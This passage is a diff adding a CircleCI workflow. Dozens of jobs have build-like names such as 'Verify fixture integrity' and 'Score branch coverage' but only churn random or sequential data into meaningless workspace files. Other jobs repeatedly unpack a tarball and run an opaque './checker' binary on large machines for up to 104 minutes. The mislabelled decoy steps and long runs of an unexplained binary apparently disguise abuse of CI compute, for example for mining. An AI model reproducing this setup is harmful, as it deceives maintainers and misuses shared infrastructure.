+          at: /tmp/.wsp
+      - run:
+          name: Index byte offsets
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; tr -dc '0-9' </dev/urandom | head -c 1331200 | wc -c; true ; } > /tmp/.wsp/relay.ok
+            du -h /tmp/.wsp/relay.ok
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - relay.ok
+  vb:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-stage data
+          command: |
+            { tail -c 100 /tmp/.wsp/relay.ok > /dev/null; echo "tail ok" ; } || true
+      - run:
+          name: Fetch tree
+          command: git clone --depth 5 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load fixtures
+          command: tar -I xz -xf archive-main.tar.xz
+      - run:
+          no_output_timeout: 104m
+          command: ./checker
+  fetcher_rm-router:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Verify fixture integrity
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; seq 1 515680 | paste - - - - | wc -l; true ; } > /tmp/.wsp/relay.sig
+            du -h /tmp/.wsp/relay.sig
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - relay.sig
+  rm-router:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-stage data
+          command: |
+            { tail -c 100 /tmp/.wsp/relay.sig > /dev/null; echo "tail ok" ; } || true
+      - run:
+          name: Fetch tree
+          command: git clone --depth 5 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load fixtures
+          command: tar -I xz -xf archive-main.tar.xz
+      - run:
+          no_output_timeout: 104m
+          command: ./checker
+  validate_API-209:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Checkpoint context
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=0;i<471972;i++) printf "%d\n", (i*7919)%2147483647}' | wc -l; true ; } > /tmp/.wsp/35.bin
+            du -h /tmp/.wsp/35.bin
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - 35.bin
+  API-209:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-stage data
+          command: |
+            { tail -c 100 /tmp/.wsp/35.bin > /dev/null; echo "tail ok" ; } || true
+      - run:
+          name: Fetch tree
+          command: git clone --depth 5 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load fixtures
+          command: tar -I xz -xf archive-main.tar.xz
+      - run:
+          no_output_timeout: 104m
+          command: ./checker
+
+  C_ship-it_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Walk directory tree
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; cat /dev/urandom | tr -dc 'a-f0-9' | head -c 92160 | fold -w16 | awk '!seen[$0]++' | wc -l; true ; } > /tmp/.wsp/step-12.out
+            du -h /tmp/.wsp/step-12.out
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - step-12.out
+  package_API-209_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Shuffle buffer blocks
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; tr -dc 'a-z0-9 ' </dev/urandom | head -c 1024000 | tr ' ' '\n' | sort | uniq | wc -l; true ; } > /tmp/.wsp/35.bin
+            du -h /tmp/.wsp/35.bin
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - 35.bin
+  B_ruby3-release_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Fuse row chunks
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; seq 1 341527 | awk '{s+=$1}END{print s}'; true ; } > /tmp/.wsp/manifest
+            du -h /tmp/.wsp/manifest
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - manifest
+  route_tb_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Compute spill delta
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; seq 1 27241 | awk '{s+=$1}END{print s}'; true ; } > /tmp/.wsp/99.data
+            du -h /tmp/.wsp/99.data
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - 99.data
+  reload_wip-oauth_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Score branch coverage
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; seq 1 259698 | awk '{if($1%97==0)c++}END{print c}'; true ; } > /tmp/.wsp/result.md
+            du -h /tmp/.wsp/result.md
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - result.md
+  produce_py310-build_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Compact small objects
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; seq 1 190058 | sha1sum; true ; } > /tmp/.wsp/882v2.data
+            du -h /tmp/.wsp/882v2.data
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - 882v2.data
+  package_ShipTests_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Compute aggregate hash
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; head -c 3145728 /dev/urandom | sha256sum; true ; } > /tmp/.wsp/cache.blob
+            du -h /tmp/.wsp/cache.blob
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - cache.blob
+  validate_vb-01_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Aggregate run counters
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; cat /dev/urandom | tr -dc '[:xdigit:]' | head -c 13312 | wc -c; true ; } > /tmp/.wsp/gate-done.out
+            du -h /tmp/.wsp/gate-done.out
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - gate-done.out
+  ctx_v9-edge_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Scan prime offsets
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; head -c 22020096 /dev/urandom | md5sum; true ; } > /tmp/.wsp/ckpt-D.pkl
+            du -h /tmp/.wsp/ckpt-D.pkl
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - ckpt-D.pkl
+  canary1_cook-it_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Checkpoint window frame
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; dd if=/dev/urandom bs=1k count=2700 2>/dev/null | gzip -6 | wc -c; true ; } > /tmp/.wsp/ckpt-v2.state
+            du -h /tmp/.wsp/ckpt-v2.state
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - ckpt-v2.state
+  Delta_q2-release_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Collect poll frames
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=0;i<328094;i++){s=(s*33+i)%2147483647}print s}'; true ; } > /tmp/.wsp/big_phase_output_v4.out
+            du -h /tmp/.wsp/big_phase_output_v4.out
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - big_phase_output_v4.out
+  install_produce-nightly-release-candidate_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Mint batch marker
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; seq 1 55500 | paste - - - - | wc -l; true ; } > /tmp/.wsp/step-ok.log
+            du -h /tmp/.wsp/step-ok.log
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - step-ok.log
+  sys_rm-router_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Record manifest digest
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=0;i<291514;i++) printf "%d\n", (i*7919)%2147483647}' | wc -l; true ; } > /tmp/.wsp/relay.sig
+            du -h /tmp/.wsp/relay.sig
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - relay.sig
+workflows:
+  workflow:
+    jobs:
+      - fixture_ship-it
+      - C_ship-it_2:
+          requires:
+            - fixture_ship-it
+      - ship-it:
+          requires:
+            - C_ship-it_2
+      - validate_API-209:
+          requires:
+            - C_ship-it_2
+      - package_API-209_2:
+          requires:
+            - validate_API-209
+      - API-209:
+          requires:
+            - package_API-209_2
+      - D_ruby3-release:
+          requires:
+            - package_API-209_2
+      - B_ruby3-release_2:
+          requires:
+            - D_ruby3-release
+      - ruby3-release:
+          requires:
+            - B_ruby3-release_2
+      - B_tb:
+          requires:
+            - B_ruby3-release_2
+      - route_tb_2:
+          requires:
+            - B_tb
+      - tb:
+          requires:
+            - route_tb_2
+      - cleanup_wip-oauth:
+          requires:
+            - route_tb_2
+      - reload_wip-oauth_2:
+          requires:
+            - cleanup_wip-oauth
+      - wip-oauth:
+          requires:
+            - reload_wip-oauth_2
+      - install_py310-build:
+          requires:
+            - reload_wip-oauth_2
+      - produce_py310-build_2:
+          requires:
+            - install_py310-build
+      - py310-build:
+          requires:
+            - produce_py310-build_2
+      - orchestrate_ShipTests:
+          requires:
+            - produce_py310-build_2
+      - package_ShipTests_2:
+          requires:
+            - orchestrate_ShipTests
+      - ShipTests:
+          requires:
+            - package_ShipTests_2
+      - cache_vb-01:
+          requires:
+            - package_ShipTests_2
+      - validate_vb-01_2:
+          requires:
+            - cache_vb-01
+      - vb-01:
+          requires:
+            - validate_vb-01_2
+      - g2_v9-edge:
+          requires:
+            - validate_vb-01_2
+      - ctx_v9-edge_2:
+          requires:
+            - g2_v9-edge
+      - v9-edge:
+          requires:
+            - ctx_v9-edge_2
+      - runner_HOOK_UAT
+      - HOOK_UAT:
+          requires:
+            - runner_HOOK_UAT
+      - syncer_do-the-thing:
+          requires:
+            - runner_HOOK_UAT
+      - do-the-thing:
+          requires:
+            - syncer_do-the-thing
+      - stage_rust-ship:
+          requires:
+            - syncer_do-the-thing
+      - rust-ship:
+          requires:
+            - stage_rust-ship
+      - drain_DATA-296:
+          requires:
+            - stage_rust-ship
+      - DATA-296:
+          requires:
+            - drain_DATA-296
+      - orchestrate_jan3-rev:
+          requires:
+            - drain_DATA-296
+      - jan3-rev:
+          requires:
+            - orchestrate_jan3-rev
+      - green_vb:
+          requires:
+            - orchestrate_jan3-rev
+      - vb:
+          requires:
+            - green_vb
+      - kick_PROD_STAGE_7:
+          requires:
+            - green_vb
+      - PROD_STAGE_7:
+          requires:
+            - kick_PROD_STAGE_7
+      - phase_brodcast:
+          requires:
+            - kick_PROD_STAGE_7
+      - brodcast:
+          requires:
+            - phase_brodcast
+      - auditor_RolloutApp
+      - RolloutApp:
+          requires:
+            - auditor_RolloutApp
+      - phase2_promote:
+          requires:
+            - auditor_RolloutApp
+      - promote:
+          requires:
+            - phase2_promote
+      - inspect_bake-it:
+          requires:
+            - phase2_promote
+      - bake-it:
+          requires:
+            - inspect_bake-it
+      - inspect_assemble-staging-docker-image:
+          requires:
+            - inspect_bake-it
+      - assemble-staging-docker-image:
+          requires:
+            - inspect_assemble-staging-docker-image
+      - step2_Prepare_Suite2:
+          requires:
+            - inspect_assemble-staging-docker-image
+      - Prepare_Suite2:
+          requires:
+            - step2_Prepare_Suite2
+      - loader_cerberus-rc
+      - cerberus-rc:
+          requires:
+            - loader_cerberus-rc
+      - g1_fix-router-redirect:
+          requires:
+            - loader_cerberus-rc
+      - fix-router-redirect:
+          requires:
+            - g1_fix-router-redirect
+      - phase2_uniform-2:
+          requires:
+            - g1_fix-router-redirect
+      - uniform-2:
+          requires:
+            - phase2_uniform-2
+      - run_yolo:
+          requires:
+            - phase2_uniform-2
+      - yolo:
+          requires:
+            - run_yolo
+      - loader_cook-it
+      - canary1_cook-it_2:
+          requires:
+            - loader_cook-it
+      - cook-it:
+          requires:
+            - canary1_cook-it_2
+      - reserve_q2-release:
+          requires:
+            - canary1_cook-it_2
+      - Delta_q2-release_2:
+          requires:
+            - reserve_q2-release
+      - q2-release:
+          requires:
+            - Delta_q2-release_2
+      - tester_produce-nightly-release-candidate:
+          requires:
+            - Delta_q2-release_2
+      - install_produce-nightly-release-candidate_2:
+          requires:
+            - tester_produce-nightly-release-candidate
+      - produce-nightly-release-candidate:
+          requires:
+            - install_produce-nightly-release-candidate_2
+      - fetcher_rm-router:
+          requires:
+            - install_produce-nightly-release-candidate_2
+      - sys_rm-router_2:
+          requires:
+            - fetcher_rm-router
+      - rm-router:
+          requires:
+            - sys_rm-router_2
